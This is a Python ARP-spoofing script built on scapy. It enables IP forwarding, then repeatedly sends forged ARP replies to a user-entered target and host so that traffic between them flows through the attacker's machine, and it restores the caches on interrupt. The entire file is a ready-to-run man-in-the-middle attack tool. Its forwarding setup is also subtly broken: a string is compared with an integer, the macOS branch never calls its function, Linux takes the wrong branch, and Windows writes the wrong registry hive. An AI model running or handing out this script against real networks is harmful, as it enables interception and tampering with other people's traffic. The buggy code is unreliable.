from scapy.all import Ether, ARP, srp, send
import time
import os


try:
    import _winreg as winreg
except ImportError:
    pass


def _enable_linux_ipforwarding():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def _enable_macosx_ipforwarding():
    os.system('sudo sysctl -w net.inet.ip.forwarding=1')


def _enable_windows_ipforwarding():
    name = "IPEnableRouter"
    value = 1
    REG_PATH = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, 
                                       winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_DWORD, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError:
        return False


def enable_ip_route():
    print("Enabling IP Forwarding...")
    _enable_windows_ipforwarding() if "nt" in os.name else (_enable_macosx_ipforwarding if "posix" in os.name else _enable_linux_ipforwarding())
    print("IP Forwarding Enabled...")


def get_mac(ip):
    # Sending ARP packet to know hardware address
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0) 
    if ans:
        return ans[0][1].src


def poison(target_ip, host_ip):
    # Getting MAC address of the target
    target_mac = get_mac(target_ip)
    # Crafting ARP response packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # Sending the packet
    send(arp_response)
    # Getting our hardware address
    self_mac = ARP().hwsrc
    # Printing the current activity
    print("SPOOFED " + target_ip + ": " + host_ip + " is-at " + self_mac)


def restore(target_ip, host_ip):
    # Getting hardware address of the target
    target_mac = get_mac(target_ip)
    # Getting hardware address of the host
    host_mac = get_mac(host_ip)
    # Crafting ARP response packet to restore
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # Sending the restore packet
    send(arp_response, verbose=0, count=5)
    print("(UN) SPOOFED " + target_ip + ": " + host_ip + " is-at " + host_mac)


if __name__ == "__main__":
    target = input("Enter target IP address: ")
    host = input("Enter host IP address: ")
    enable_ip_route()
    try:
        while True:
            poison(target, host)
            poison(host, target)
            time.sleep(1)
    except KeyboardInterrupt:
        print("Keyboard Interrupt Detected, Unspoofing...")
        restore(target, host)
        restore(host, target)

